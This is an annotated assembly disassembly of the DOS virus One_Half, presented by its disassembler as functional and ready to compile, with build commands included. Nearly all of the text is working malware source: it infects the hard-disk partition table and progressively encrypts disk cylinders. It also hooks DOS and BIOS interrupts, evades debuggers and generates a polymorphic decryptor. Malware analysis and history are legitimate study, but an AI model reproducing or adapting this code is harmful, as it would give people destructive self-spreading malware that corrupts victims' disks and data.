; Virus One_Half
; Disassembly done by Ratter

; It's a polymorfic reverzibel multiparit virus from Slovak coder known
; under the nick Vyvojar(==Developer). It's also author of Level3.
; This is a disassembly I enjoyed the most. It's a one of the best virus
; in the dead world of DOS.
; It's functional. Just compile and run :)

; To Vyvojar: If ya're still living, could ya pls lemme know about it?
;	      I would be very happy if i could speak with you sometimes ...
; To otherz who are reading this: Pls lemme know if there's any bug in the code.
;				  Or just to say ya like this :)
; You can reach me on Undernet channel #virus, #3c or via email: ratter@atlas.cz

; Compile:
; tasm /t/m2 one_half.asm
; tlink /t one_half.obj

.486p

.487

seg_a		segment	byte public use16
		assume	cs:seg_a, ds:seg_a


		org	100h

one_half	proc	far
start:
		jmp	loc_08d1		; jmp to viruz_start
		;jmp	loc_0208		; jmp to decode routine_start

		db	101 dup (0)
loc_0168:
		db	 81h,0C0h,0FEh, 6Eh	; add	ax, 6EFEh
		jmp	loc_056c
		;
		db	19 dup (0)
loc_0182:
		cld
		std
		jnz	short loc_01B1
		jmp	loc_08D1
		;
		db	40 dup (0)
		;
loc_01B1:
		xor	[di], ax
		jmp	short loc_0168
		;
		db	64 dup (0)
		;
loc_01f5:
		db	2eh			; cs:
		mov	di, 582h
		db	36h			; ss:
		db	3eh			; ds:
		jmp	loc_049b
		;
		db	10 dup (0)
		;
loc_0208:
		push	ax
		nop
		db	36h			; ss:
		sti
		db	36h			; ss:
		clc
		sti
		jmp loc_0381
		;
		db	367 dup (0)
		;
loc_0381:
		push	cs
		cld
		jmp	loc_047c
		;
		db	246 dup (0)
		;
loc_047C:
		nop
		sti
		db	36h			; ss:
		clc
		nop
		pop	ds
		db	36h			; ss:
		jmp	loc_01f5
		;
		db	21 dup (0)
		;
loc_049b:
		cld
		db	3eh			; ds:
		mov	ax, 0bfbah
		db	3eh			; ds:
		std
		jmp	loc_01b1
		;
		db	148 dup (0)
		;
loc_0539:
		db	 81h,0FFh, 5Ah, 13h	; cmp	di, 135ah
		sti
		jmp	loc_0182
		;
		db	43 dup (0)
		;
loc_056c:
		clc
		sti
		cmc
		db	3eh			; ds:
		nop
		inc	di
		db	36h			; ss:
		jmp	loc_0539
		pop	ss
		;
		db	12 dup (0)
		;

		;
loc_0582:
		;
p		label	near
p_		equ	offset the_second_part - offset boot_start
p__		equ	presun_rutiny + (p - buffer)
		;
_mcb_		db	'Z'			; it'z last_block
		dw	9F01h			; PSP
		dw	0FFh			; 4096 bytez
		db	3 dup(?)		; reserved
		db	'COMMAND', 0		; blockz_owner_name ...
		;
exe_header	dw	20CDh			; exe_signature
part_pag	dw	501eh
page_cnt	dw	09b4h
relo_cnt	dw	0
hdr_size	dw	21cdh
min_mem		dw	1f58h
max_mem		dw	0bac3h
relo_ss		dw	03d0h
exe_sp		dw	0efe8h
exe_flag	db	00h			; checksum
		db	0b4h
exe_ip		dw	0100h
relo_cs		dw	0FFF0h
tabl_off	dw	0BA05h
		;
decode_routine_table:
		dw	0208h			; here'z the table
		dw	0381h			; of offsetz, where are
		dw	047ch			; the chunkz of code of
		dw	01f5h			; decode_routine
		dw	049bh
xor_offset	dw	01b1h
		dw	0168h
		dw	056ch
		dw	0539h
jnz_offset	dw	0182h
		;
beginning_ofs	dw	07beh
		;
overwritten_bytez:
		db	06h, 83h, 05h, 00h, 00h, 2Eh
		db	8Ch, 0Eh, 85h, 05h, 4Fh, 02h
		db	00h, 2Eh,0A1h,0A3h, 05h, 26h
		db	0C7h
		db	'G.com <jmen'
		db	0Bh, 26h, 3Ah, 47h, 21h,0BAh
		db	4Ah, 05h, 0Fh
		db	'„_driveru>', 0Ah, 't'
		db	0FFh,0C6h, 44h,0FFh, 00h,0B8h
		db	03h, 4Bh,0BBh, 80h, 00h, 8Ah
		db	0Ch, 0Ah,0C9h,0BAh, 68h, 04h
		db	0Fh
		db	'ys ...', 0Ah, 0Dh, '$'
		db	17h
		db	'instalovan'
		db	02h,0EBh, 03h,0E9h, 43h, 02h
		db	4Eh, 56h, 89h, 36h
		;

		;
hdr_size_	dw	10h
date_div	dw	1Eh
page_size_	dw	200h
		;

; Here starts boot_version of One_Half
boot_start:
		xor bx, bx
		cli
		mov sp, 07c00h			; set up stack
		mov ss, bx			; 2 0000h:7c00h
		sti
		mov ds, bx
		sub word ptr ds:[413h], 4	; dec mem_size o 4 kila
		mov cl, 6
		int 12h				; gimme mem_size
		shl ax, cl			; count the segment
		mov dx, 80h			; first harddisk, 0. head
		mov es, ax			; my_new_seg 2 es
		db	0b9h			; mov cx, ?
viruz_start_sec	dw	0bh			; gimme virus_start_sec
		mov ax, 0207h			; read 7 secz
		push es				; (viruz_body)
		int 13h
		mov ax, offset the_second_part - p
		push ax
		retf				; go2 new_segment_part
		;
the_second_part:
		mov word ptr ds:[21h * 4 + 2], cs; store cs 2 21h * 4 + 2
		mov ax, word ptr ds:[46ch]	; gimme tick_counter
		push ds
		push cs				; make ds = cs
		pop ds
		mov word ptr ds:[mov_bx_? - p], ax	; store counter
		mov ax, cs
		inc ax
		mov word ptr ds:[_mcb_ + 1 - p], ax	; store block_owner
		mov byte ptr ds:[run_jmp - p], 0; nulluj displ8 2 set our
						; own _mcb_ as last_one
		call sub_078b			; move presun_rutiny
		pop es
		mov bx, sp			; 7c00h 2 bx
		push es
		mov si, word ptr es:[bx+p_]	; gimme cur_cyl_number_
						; _2_crypt
		db	81h, 0feh		; cmp si, ?
lowest_cyl	dw	07h			; less than lowest_cyl ?
		jbe loc_06d6
		push si				; nope
		sub si, 2			; ok crypt 2 cylinderz
		mov word ptr ds:[not_crypt_cyl - p], si	; store cyl - 2
		pop si
		mov ah, 08h			; gimme drivez_paramz
		int 13h
		jc loc_06d6			; error ?
		mov al, cl			; gimme max_sec_number
		and al, 03fh			; voklesti max_sec
		mov byte ptr ds:[secz_count - p__], al	; secz_2_crypt
		mov cl, 1			; starting_sec 2 cl
		mov bh, 7eh			; buffer_ptr 2 7e00h
		mov word ptr ds:[buf_ptr - p__], bx	; store buffer_ptr
		mov dl, 80h			; set up drive 2 first harddisk
loc_069E:
		dec	si			; dec cylinder_number
		call	sub_0798		; convert cyl_number
		push	dx
loc_06A3:
		mov	ah, 2			; read 1 cylinder
		push	ax
		int	13h
		pop	ax
		jc	short loc_06B4		; error ?
		db	0e8h			; call crypt_
		dw	offset crypt_ - presun_rutiny + buffer - next_
next_		label	near			; crypt_ it
		inc	ah			; make function 03h
		push	ax
		int	13h			; and write crypted_cyl
		pop	ax
loc_06B4:
		jc	short loc_072B		; error ?
		test	dh, 3Fh			; last head ?
		jz	short loc_06BF
		dec	dh			; dec head
		jmp	short loc_06A3		; and go on
loc_06BF:					; yope
		pop	dx
		db	81h, 0feh		; cmp	si, ?
not_crypt_cyl	dw	1bfh			; ok 2 cylinderz crypted_ ?
		ja	loc_069E
loc_06C6:					; yope
		mov	bh, 7Ch			; buffer 2 7c00h
		mov	es:[bx+p_], si		; store new cur_cyl_number_2_
		mov	ax, 301h		; _crypt
		mov	cx, 1			; and write partition_table
		mov	dh, ch			; (boot_start) back
		int	13h
loc_06D6:
		mov	ds:[cur_cyl_number - p__], si
		db	81h, 0feh		; cmp	si, ?
one_half_cyl	dw	136h			; more than one_half_crypted ?
		ja	short loc_06E3
		call	sub_07EC		; ok try 2 write text
loc_06E3:					; nope not yet
		mov	ax, 201h		; ok now read
		mov	bx, 7C00h		; 2 buffer 7c00h
		mov	cx, ds:[viruz_start_sec - p]	; gimme viruz_...
		dec	cx			; go2 orig_partition_table
		mov	dx, 80h			; orig_partition_table
		int	13h
		cli
		les	ax, dword ptr es:[13h * 4]	; gimme old_int_13h
		mov	ds:[old_int_13h - p__], ax	; and store it
		mov	ds:[old_int_13h - p__ + 2], es
		pop	es
		push	es
		les	ax, dword ptr es:[1ch * 4]	; gimme old_int_1ch
		mov	ds:[old_int_1ch - p], ax	; and store it
		mov	ds:[old_int_1ch - p + 2], es
		pop	es
		push	es				; set up my own
		mov	word ptr es:[13h * 4], offset new_int_13h - p__
		mov	word ptr es:[13h * 4 + 2], cs	; new_int_13h
		mov	word ptr es:[1ch * 4], offset new_int_1ch - p
		mov	word ptr es:[1ch * 4 + 2], cs	; and new_int_1ch
		sti
		push	bx
		retf				; and jump 2 orig_partition

; Diz uncryptz_cylinderz if any error occurez
loc_072B:
		xor	ah, ah
		push	ax
		int	13h			; try 2 reset the disk
		pop	ax
loc_0731:
		inc	dh			; inc head
		mov	ah, dh			; head 2 ah
		pop	dx			; pop max_head
		push	dx
		cmp	ah, dh			; cmp cur_head with max_head
		ja	short loc_074E		; above ?
		mov	dh, ah			; cur_head 2 dh
		mov	ah, 2			; read cylinder
		push	ax
		int	13h
		pop	ax
		db	0e8h			; call crypt_
		dw	offset crypt_ - presun_rutiny + buffer - next__
next__		label	near			; uncrypt_ it
		inc	ah
		push	ax
		int	13h			; and write it back
		pop	ax
		jmp	short loc_0731
loc_074E:					; yope (error on first_cyl)
		pop	dx			; pop max_head
		inc	si			; inc cyl_number
		jmp	loc_06C6		; and end with crypt_
			
new_int_1ch:
		push	ax
		push	ds
		push	es
		xor	ax, ax
		mov	ds, ax
		les	ax, dword ptr ds:[21h * 4]	; gimme int_21h
		mov	cs:[old_int_21h - p__], ax	; store offset
		mov	ax, es			; gimme seg
		cmp	ax, 800h		; are we under 800h ?
		ja	short loc_0783
		mov	word ptr cs:[old_int_21h - p__ + 2], ax	; yope
						; we've got dos_int_21h_seg
		les	ax, dword ptr cs:[old_int_1ch - p]; gimme old_int_1ch
		mov	ds:[1ch * 4], ax	; restore it back
		mov	word ptr ds:[1ch * 4 + 2], es
		mov	word ptr ds:[21h * 4], offset new_int_21h - p;and set up
		mov	word ptr ds:[21h * 4 + 2], cs	; my new_int_21h
loc_0783:					; nope
		pop	es
		pop	ds			; restore regz
		pop	ax			; and
		db	0EAh			; jmp far ptr old_int_1ch
old_int_1ch	dw	0FF53h, 0F000h

one_half	endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz movez some routinez ...
sub_078B	proc	near
		mov	si, offset presun_rutiny - p
		mov	di, offset buffer - p
		mov	cx, offset f_read_ - offset presun_rutiny - 4
		cld
		rep	movsb
		retn
sub_078B	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz makez from cyl_number_in_si valid cx_reg
sub_0798	proc	near
		push	ax
		mov	ax, si
		mov	ch, al
		push	cx
		mov	cl, 4
		shl	ah, cl
		pop	cx
		mov	al, 3Fh			; '?'
		and	dh, al
		and	cl, al
		not	al
		push	ax
		and	ah, al
		or	dh, ah
		pop	ax
		shl	ah, 1
		shl	ah, 1
		and	ah, al
		or	cl, ah
		pop	ax
		retn
sub_0798	endp

text_		db	'Dis is one half.', 0Dh, 0Ah, 'Pr'
		db	'ess any key to continue ...', 0Dh
		db	0Ah

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz writez text if run_counter is even and it iz even day etc.
sub_07EC	proc	near
		mov	ah, 4			; gimme CMOS date_&_time
		int	1Ah
		jc	short loc_ret_0816
		test	dl, 3			; day even etc. ?
		jnz	short loc_ret_0816
		test	word ptr ds:[run_counter - p], 1; run_counter is even
		jnz	short loc_ret_0816
		mov	cx, offset sub_07ec - offset text_; gimme text_length
		mov	si, offset text_ - p	; gimme text_offset
		mov	ah, 0Fh			; gimme cur_video_page_number
		int	10h			; why ?
		mov	bl, 7
		mov	ah, 0Eh			; print char 2 cur_page ...

locloop_080D:
		lodsb				; gimme byte
		int	10h
		loop	locloop_080D		; and go on

		xor	ah, ah			; wait 4 keyprezz
		int	16h

loc_ret_0816:
		retn				; and end ...
sub_07EC	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz callz int_21h_file_fc with a handle in bx
sub_0817	proc	near
		push	bx
		db	0bbh			; mov	bx, ?
handle_		dw	0			; gimme handle
		int	21h			; call int_21h
		pop	bx
		retn				; and end ...
sub_0817	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz callz int_13h
int_13h		proc	near
		pushf
		cli
		db	9Ah			; call far ptr int_13h_addr
int_13h_addr	dw	774h, 70h
		retn
int_13h		endp


; This is used for int_13h tracing
new_int_01h:
		push	bp
		mov	bp, sp
		db	0ebh
jump_patch_?	db	offset loc_084f - ($ + 1); jmp	short loc_084F
		db	81h, 7eh, 04h		; cmp	word ptr [bp+4], ?
which_segment_?	dw	0253h
		ja	short loc_0853
		push	ax
		push	bx
		push	ds
		lds	ax, dword ptr [bp+2]
		db	0bbh
new_int_01h_mov_bx_?	dw	5200h		; mov bx, ?
		mov	cs:[int_13h_addr - p][bx], ax
		mov	cs:[int_13h_addr - p + 2][bx], ds
		mov	byte ptr cs:[jump_patch_? - p][bx], offset loc_084f - (offset jump_patch_? + 1)
		pop	ds
		pop	bx
		pop	ax
loc_084F:
		and	byte ptr [bp+7], 0FEh
loc_0853:
		pop	bp
		iret

; Diz installz viruz 2 mem
loc_0855:
		pop	bx			; pop index
		pop	ax			; pop es_seg
		push	ax
		dec	ax			; go2 mcb_block
		mov	ds, ax			; store it 2 ds
		cmp	byte ptr ds:[0], 5Ah	; last one ?
		jne	short loc_08CE
		add	ax, ds:[3]		; add blockz_size
		sub	ax, 0FFh		; sub 4 viruz_body
		mov	dx, cs			; (4 our bufferz etc.)
		mov	si, bx			; index 2 so
		mov	cl, 4
		shr	si, cl			; make paragraphz
		add	dx, si			; add it 2 cs
		db	2eh, 8bh, 0b7h, 1ah, 00h; mov	si, cs:[1ah][bx]
						; gimme min_mem (from exe_header)
		cmp	si, 106h
		jae	short loc_0881
		mov	si, 106h
loc_0881:
		add	dx, si			; add min_mem
		cmp	ax, dx			; less ?
		jb	short loc_08CE
		mov	byte ptr ds:[0], 4Dh	; make middle_block
		sub	word ptr ds:[3], 100h	; sub 100h paragraphz
						; (0ffh viruz and 01h _mcb_)
		mov	ds:[12h], ax		; set new mem_top 2 PSP
		mov	es, ax			; gimme where_2_move_seg
		push	cs
		pop	ds
		inc	ax
		mov	ds:[1], ax		; store owner
		mov	byte ptr [which_jump_? - p][bx], 0EBh
		mov	si, bx			; gimme index
		xor	di, di			; move 2 0000h
		mov	cx, offset buffer - p	; gimme viruz_size
		rep	movsb			; and finally move
		push	es
		pop	ds
		call	sub_078B		; move presun_rutiny
		xor	ax, ax
		mov	ds, ax
		cli
		mov	ax, ds:[21h * 4]	; gimme old_int_21h
		mov	es:[old_int_21h - p__], ax	; store it
		mov	ax, word ptr ds:[21h * 4 + 2]
		mov	es:[old_int_21h - p__ + 2], ax
		mov	word ptr ds:[21h * 4], offset new_int_21h - p
		mov	word ptr ds:[21h * 4 + 2], es	; and set my own
		sti				; int_21h
loc_08CE:
		jmp	loc_0A1E		; and go on
				
; Diz iz the beginning ...
loc_08D1:
		call	sub_08D4

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_08D4	proc	near
		pop	si
		sub	si, offset sub_08d4 - p ; count where we are
		mov	[new_int_01h_mov_bx_? - p][si], si
		push	es
		push	si			; si = 582h
		cld
		inc	word ptr [run_counter - p][si]
		mov	byte ptr [which_jump_? - p][si], 74h
		xor	ax, ax
		mov	es, ax
		mov	ax, es:[46Ch]		; gimme tick_counter
		mov	[mov_bx_? - p][si], ax	; store it
		mov	[crypt_value - p][si], ax; 2 timez
		mov	ax, 4B53h		; am i in mem ?
		int	21h
		cmp	ax, 454Bh		; check mark
		je	short loc_0965
		mov	ah, 52h			; nope so go on
		int	21h			; gimme list_of_listz_ptr
		mov	ax, es:[bx-2]		; gimme 1. MCB_segment
		mov	[which_segment_? - p][si], ax	; store it
		mov	byte ptr [jump_patch_? - p][si], 0
		mov	ax, 3501h		; get int_01h
		int	21h
		push	bx			; store it to stack
		push	es
		mov	ax, 3513h		; get int_13h
		int	21h
		mov	[int_13h_addr - p][si], bx	; store it to
		mov	[int_13h_addr - p + 2][si], es; variablez
		mov	ax, 2501h		; set my int_01h
		lea	dx, [new_int_01h - p][si]
		int	21h
		lea	bx, [buffer - p][si]
		mov	cx, 1			; read partition_table
		mov	dx, 80h
		push	cs
		pop	es
		pushf
		pop	ax
		or	ah, 1			; set trap_flag
		push	ax
		popf
		mov	ax, 201h		; and trace int_13h
		call	int_13h
		pushf
		pop	ax
		and	ah, 0FEh		; null trap_flag
		push	ax
		popf
		pop	ds
		pop	dx
		pushf
		mov	ax, 2501h		; restore int_01h
		int	21h
		popf
		jc	short loc_09C0		; any errorz ?
		push	cs
		pop	ds
		cmp	word ptr [bx+25h], offset the_second_part - p
		jne	short loc_0968		; iz in partition my viruz ?
						; (mark)
loc_0965:
		jmp	loc_0A1D
loc_0968:
		cmp	word ptr [bx + 180h], 72Eh; next mark
		je	short loc_09C0
		mov	ah, 8			; gimme hard_paramz
		mov	dl, 80h			; prvniho_hadru
		call	int_13h
		jc	short loc_09C0		; error ?
		and	cx, 3Fh			; voklesti max_sector
		mov	[max_sektor - p][si], cl
		mov	[max_sektor_2 - p][si], cl
		and	dh, 3Fh			; voklesti headz
		mov	[max_heads - p][si], dh
		mov	ax, 301h
		sub	cl, 7
		mov	[partition_sec_n - p][si], cl
		mov	dx, 80h
		call	int_13h			; write partition_table
		jc	short loc_09C0		; error ?
		push	cx
		push	dx
		push	si
		xchg	di, si
		mov	cx, 4			; 4 entryz
		add	bx, 1EEh		; go2 last_parition_entry
locloop_09A9:
		mov	al, [bx+4]		; read FAT type
		cmp	al, 1			; DOS 12bit ?
		je	short loc_09C3
		cmp	al, 4			; 4 = DOS 16bit ?
		jb	short loc_09B8		; 5 = EXTENDED_DOS_PARTITION ?
		cmp	al, 6			; 6 = BIGDOS (nad 32Mbyte) ?
		jbe	short loc_09C3
loc_09B8:
		sub	bx, 10h			; every record has 10h bytez
		loop	locloop_09A9

		pop	si
		pop	dx
		pop	cx
loc_09C0:
		jmp	loc_0855		; jmp 2 mem_install
loc_09C3:
		mov	cx, [bx+2]		; gimme boot_start
		mov	dh, [bx+1]		; gimme head
		call	sub_0D2F		; convert_it
		add	si, 7			; make valid cyl_number
		mov	[lowest_cyl - p][di], si	; store it
		xchg	si, ax
		mov	cx, [bx+6]		; gimme end cylinder
		mov	dh, [bx+1]		; gimme head
		call	sub_0D2F		; convert_it
		mov	[max_cyl_number - p][di], si; store it
		mov	[mov_ax_? - p][di], si	; store it
		add	ax, si
		shr	ax, 1			; div with 2
		mov	[one_half_cyl - p][di], ax; store one_half
		pop	si
		pop	dx
		pop	cx
		mov	ax, 307h
		xchg	bx, si
		inc	cx
		mov	[viruz_start_sec - p][bx], cx
		call	int_13h			; write viruz_ body
		jc	loc_09C0		; (whole)
		lea	si, [boot_start - p][bx]; and now move boot
		lea	di, [buffer - p][bx]
		push	di
		mov	cx, offset the_second_part - offset boot_start
		rep	movsb
		db	0b8h			; mov	ax, ?
mov_ax_?	dw	265h			; store starting_sector_
		stosw				; _2_ crypt
		mov	ax, 301h		; write the new parition_table
		pop	bx
		mov	cx, 1
		call	int_13h
		jc	loc_09C0		; error ?
loc_0A1D:
		pop	bx			; nope
loc_0A1E:
		push	cs			; dis is a renewal of parts
		pop	ds			; that were overwritten 
		push	cs			; by decode routine
		pop	es
		db	8Dh,0B7h		; lea si, cs:[overwritt...][bx]
		dw	offset overwritten_bytez - p
		db	81h,0C3h		;add bx, offset decode_...
		dw	offset decode_routine_table - p
		mov	cx, 0Ah			; there'z 0ah_partz

locloop_0A2D:
		mov	di, [bx]		; gimme where_2_move_offset
		push	cx
		mov	cx, 0Ah			; every_part haz 0ah bytez
		rep	movsb
		pop	cx
		inc	bx			; go2 next_move_offset
		inc	bx
		loop	locloop_0A2D		; and go on

		pop	es
		db	83h,0C3h		; add	bx, 0 - (....)
		db	0 - (offset beginning_ofs - offset exe_header)
		mov	di, es			; bx 2 exe_header_offset
		add	di, 10h			; count start_seg
		add	[bx+16h], di		; store relo_cs
		add	[bx+0Eh], di		; store relo_ss
		cmp	word ptr [bx+6], 0	; what'bout relo_cnt ?
		je	short loc_0AB6		; there'z any ?
		mov	ds, es:[2ch]		; yope; gimme environment_seg
		xor	si, si			; start at offset 00h
loc_0A56:
		inc	si
		cmp	word ptr [si], 0	; eof formal_environment ?
		jne	loc_0A56
		add	si, 4			; go2 prog_name
		xchg	dx, si
		mov	ax, 3D00h		; open prog_file
		int	21h
		jc	short loc_0ADB		; error ?
		push	cs
		pop	ds
		mov	ds:[handle_ - p - 10h][bx], ax	; store handle_
		mov	dx, [bx+18h]		; gimme tabl_offset
		mov	ax, 4200h		; f_ptr 2 it
		call	sub_0817
		push	es			; store start_seg
		xchg	di, ax
loc_0A79:
		push	ax
		lea	dx, cs:[reloc_buffer - p - 10h][bx]
		mov	cx, [bx+6]		; gimme relo_cnt
		cmp	cx, (name_buffer + 34 - random_number) shr 2
		jb	short loc_0A8A		; 2 big ?
		mov	cx, (name_buffer + 34 - random_number) shr 2
						; yope gimme max_relo_cnt_now
loc_0A8A:
		sub	[bx+6], cx		; sub it from relo_cnt
		push	cx
		shl	cx, 1			; mul it with 4
		shl	cx, 1			; (segment:offset)
		mov	ah, 3Fh			; read reloc_table
		call	sub_0817
		jc	short loc_0ADB		; error ?
		pop	cx
		pop	ax
		xchg	si, dx

locloop_0A9D:
		add	[si+2], ax		; make relo_seg
		les	di, dword ptr [si]	; gimme relo_addr
		add	es:[di], ax		; and add start_seg
		add	si, 4			; go2 next entry
		loop	locloop_0A9D

		cmp	word ptr [bx+6], 0	; relo_cnt is null ?
		ja	loc_0A79		; if yope go on
		pop	es			; nope
		mov	ah, 3Eh			; so close_file
		call	sub_0817
loc_0AB6:					; nope
		push	es
		pop	ds
		cmp	byte ptr cs:[bx+12h], 0	; com_file ?
		jne	short loc_0ACC
		mov	si, bx			; gimme exe_header_offset
		mov	di, 100h
		mov	cx, 3			; move 3 bytez 2 100h
		rep	movsb
		pop	ax
		jmp	short loc_0AD7		; and go on
loc_0ACC:					; nope it'z exe_file
		pop	ax
		cli
		mov	sp, cs:[bx+10h]		; gimme sp
		mov	ss, cs:[bx+0Eh]		; gimme ss
		sti
loc_0AD7:
		jmp	dword ptr cs:[bx+14h]	; finally jmp 2 real_prog_start
loc_0ADB:
		mov	ah, 4Ch			; there waz an error !
		int	21h

		;
reloc_buffer	label	near
		;

; in : dx = max_number
; out : dx = random_number
random_number:
		mov	cs:[mov_si_? - p], si
		push	ax
		push	bx
		push	cx
		push	dx
		db	0b9h			; mov	cx, ?
mov_cx_?	dw	0b0d4h
		db	0bbh			; mov	bx, ?
mov_bx_?	dw	6210h
		mov	dx, 15Ah
		mov	ax, 4E35h
		xchg	si, ax
		xchg	dx, ax
		test	ax, ax
		jz	short loc_0AFC
		mul	bx
loc_0AFC:
		jcxz	short loc_0B03
		xchg	cx, ax
		mul	si
		add	ax, cx
loc_0B03:
		xchg	si, ax
		mul	bx
		add	dx, si
		inc	ax
		adc	dx, 0
		mov	cs:[mov_bx_? - p], ax
		mov	cs:[mov_cx_? - p], dx
		mov	ax, dx
		pop	cx
		xor	dx, dx
		jcxz	short loc_0B1E
		div	cx
loc_0B1E:
		pop	cx
		pop	bx
		pop	ax
		pop	si
		push	si
		cmp	byte ptr cs:[si], 0CCh	; there'z a breakpoint ?
loc_0B27:
		je	loc_0B27		; if yope stay in loop
						; (nice_try ...)
		db	0beh			; mov	si, ?
mov_si_?	dw	5cbh
		retn
sub_08D4	endp


; decode_routine haz 10 piecez ... (10 instructionz)
		;
instr_start:
		db	01h			; instruction_length
		db	50h			; push ?_reg
		;
		db	01h			; instruction_length
push_what	db	0eh			; push cs or push ss
		;
		db	01h			; instruction_length
		db	1fh			; pop ds
		;
		db	03h			; instruction_length
mov_index_?	db	0bfh			; mov ?_index_reg, im16
viruz_start	dw	0582h			; im16
		;
		db	03h			; instruction_length
mov_?_instr	db	0b8h			; mov ?_reg, im16
crypt_viruz_value	dw	0bfbah		; im16
		;
		db	02h			; instruction_length
		db	31h			; xor [index_reg], ?_reg
xor_?_instr	db	05h			; ModR/M
		;
		db	04h			; instruction_length
		db	81h			; add ?_reg, im16
add_?_instr	db	0c0h			; ModR/M, opcode
next_crypt_value_	dw	6efeh		; im16
		;
		db	01h			; instruction_length
inc_?_instr	db	47h			; inc ?_reg
		;
		db	04h			; instruction_length
		db	81h			; cmp ?_index_reg, im16
cmp_index_?	db	0ffh			; ModR/M, opcode
viruz_end	dw	135ah			; im16
		;
		db	02h			; instruction_length
		db	75h			; jnz disp8
		db	0efh
		;
		
		;
unimportant_instr:
		;
		nop
		stc
		clc
		sti
		db	 2Eh			; cs:
		db	 36h			; ss:
		db	 3Eh			; ds:
		cld
		std
		cmc
		;

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz movez unimportant_instr 2 buffer
; in : dx = wieviel :-)
sub_0B57	proc	near
		or	dx, dx			; count is null ?
		jz	short loc_ret_0B71
		push	si
		push	cx			; push regz
		push	dx
		mov	cx, dx			; count 2 cx

locloop_0B60:
		mov	si, offset unimportant_instr - p
		mov	dx, 0Ah			; max_random 2 0ah (10 instr)
		call	random_number		; gimme random_number
		add	si, dx			; go2 instruction
		movsb				; move it
		loop	locloop_0B60		; and go on

		pop	dx
		pop	cx			; restore regz
		pop	si

loc_ret_0B71:
		retn				; and end ...
sub_0B57	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz putz be4 and after instruction unimportant_instructionz
; in : dx = wieviel u_instr
sub_0B72	proc	near
		mov	ax, dx			; instr_count 2 ax
		inc	dx
		call	random_number		; gimme random_number
		sub	ax, dx			; sub cur_instr_count from
						; instr_count
		call	sub_0B57		; move unimportant_instr
		xchg	dx, ax
		rep	movsb			; move real_instruction
		db	81h,0FBh		; cmp bx, offset jnz_offset - p
		dw	offset jnz_offset - p	; it'z last_one ? (jnz xor_...)
		jnz	short loc_0B92
		mov	ax, ds:[xor_offset - p]	; gimme xor_offset
		sub	ax, di			; sub cur_instr_buffer_index
		add	ax, offset instr_buffer - p; add instr_buffer_back
		sub	ax, [bx]		; sub jnz_offset
		dec	di			; go2 disp8
		stosb				; and store it
loc_0B92:
		call	sub_0B57		; and now put some u_instr
						; after real_instruction
		retn				; and end ...
sub_0B72	endp

m_?_i		dw	offset mov_?_instr - p	; 0b38h	; 0b96h	; 0614h
x_?_i		dw	offset xor_?_instr - p	; 0b3dh	; 0b98h	; 0616h
a_?_i		dw	offset add_?_instr - p	; 0b40h	; 0b9ah	; 0618h
